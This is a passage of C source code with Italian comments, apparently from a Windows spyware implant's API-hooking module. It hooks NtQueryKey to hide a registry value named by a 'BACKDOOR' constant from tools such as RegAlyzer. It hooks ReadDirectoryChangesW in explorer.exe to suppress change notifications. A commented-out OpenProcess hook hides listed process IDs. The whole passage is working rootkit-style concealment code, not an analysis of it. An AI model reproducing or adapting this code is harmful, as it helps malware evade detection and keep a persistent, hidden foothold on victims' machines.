	char local_key_struct[SMLSIZE];
	KEY_FULL_INFORMATION *full_info;
	KEY_STR_INFORMATION *str_info;
	char *value_name;
	DWORD name_len;
	BOOL found;
	DWORD ret_value;
	DWORD ret_len;

	MARK_HOOK

	// Piccolo trucco per convincere il compilatore
	// a usare i parametri di chiamata
	__asm {
		PUSH ESI
		LEA ESI, DWORD PTR [EBP+0x8]
		MOV [arg_ptr], ESI
		POP ESI
	}

	INIT_WRAPPER(NtQueryKeyStruct)
	
	// Cerca di vedere se in questa chiave c'e' il 
	// valore da nascondere
	found = FALSE;
	for (index=0;;index++) {
		ret_value = pData->pNtEnumerateValueKey((HANDLE)arg_ptr[0], index, BACKDOOR, (KEY_VALUE_BASIC_INFORMATION *)local_key_struct, sizeof(local_key_struct), &ret_len);
		if (ret_len==0 || ret_value!=0)
			break;

		value_name = (char *)(((KEY_VALUE_BASIC_INFORMATION *)local_key_struct)->Name);
		name_len = (DWORD)(((KEY_VALUE_BASIC_INFORMATION *)local_key_struct)->NameLength);
		name_len /= 2; // E' in unicode 
		IF_LSTRCMP(value_name, name_to_hide, name_len)
			found = TRUE;	
	}

	CALL_ORIGINAL_API(5)

	// Se ha trovato il valore, e il tipo di informazione richiesto e' FULL_INFO e
	// c'e' il puntatore alla strutura FULL_INFO e il buffer la contiene tutta
	// diminuisce di 1 il numero di valori (se e' maggiore di 0), indipendentemente
	// dal valore di ritorno.
	full_info = (KEY_FULL_INFORMATION *)arg_ptr[2];
	if (found && arg_ptr[1]==KeyFullInformation && full_info && arg_ptr[3]>=36) 
		if (full_info->Values > 0)
			full_info->Values--;

	// Valore non definito normalmente, ma usato da RegAlyzer
	str_info = (KEY_STR_INFORMATION *)arg_ptr[2];
	if (found && arg_ptr[1]==4 && str_info && arg_ptr[3]>=24) 
		if (str_info->Values > 0)
			str_info->Values--;

	return ret_code;
}


DWORD NtQueryKeyHook_setup(HMServiceStruct *pData)
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("NTDLL.DLL"))
	VALIDPTR(NtQueryKeyData.pNtEnumerateValueKey = (NtEnumerateValueKey_t) HM_SafeGetProcAddress(hMod, "NtEnumerateValueKey"))
	memcpy(NtQueryKeyData.name_to_hide, REGISTRY_KEY_NAME, sizeof(NtQueryKeyData.name_to_hide)); // E' sicuramente NULL terminato

	NtQueryKeyData.dwHookLen = 950;
	 
	return 0;
}



//////////////////////////
//
// ReadDirectoryChangesW
//
//////////////////////////

typedef struct {
	COMMONDATA;
} ReadDirectoryChangesWStruct;

ReadDirectoryChangesWStruct ReadDirectoryChangesWData;

static BOOL WINAPI ReadDirectoryChangesWHook(HANDLE hDirectory,
										 LPVOID lpBuffer,
										 DWORD nBufferLength,
										 BOOL bWatchSubtree,
										 DWORD dwNotifyFilter,
										 LPDWORD lpBytesReturned,
										 LPOVERLAPPED lpOverlapped,
										 LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	BOOL *Active;
	
	MARK_HOOK

	INIT_WRAPPER(ReadDirectoryChangesWStruct)

	__asm{
		PUSH EAX
		MOV EAX, DWORD PTR [EBP+0x18]
		AND EAX, 0xFFFFFFEF
		MOV DWORD PTR [EBP+0x18], EAX
		POP EAX
	}

	CALL_ORIGINAL_API(8)
	
	return ret_code;
}


static DWORD ReadDirectoryChangesWHook_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (stricmp(proc_name, "explorer.exe"))
			return 1; // Hooka solo explorer
	} else
		return 1;
	// Variabili shared per la creazione degli Hooks...
	ReadDirectoryChangesWData.dwHookLen = 550;
	return 0;
}

/*
///////////////////////////
//
// OpenProcess
//
///////////////////////////

typedef struct {
	COMMONDATA;
} OpenProcessStruct;

OpenProcessStruct OpenProcessData;

static HANDLE WINAPI OpenProcessHook(DWORD ARG1,
									 BOOL  ARG2,
									 DWORD op_pid)
{
	pid_hide_struct *p_pid_hide;
	INIT_WRAPPER(OpenProcessStruct)

	// Legge la lista dei PID da nascondere
	p_pid_hide = (pid_hide_struct *)pData->pHM_IpcCliRead(WR_HIDE_PID);

	IF_PID_NOT_PRESENT(op_pid, p_pid_hide) {
		CALL_ORIGINAL_API(3)
		return (HANDLE)ret_code;
	} else
		return NULL;
}

DWORD OpenProcessHook_setup(HMServiceStruct *pData)
{
	OpenProcessData.dwHookLen = 400;
	OpenProcessData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	return 0;
}
*/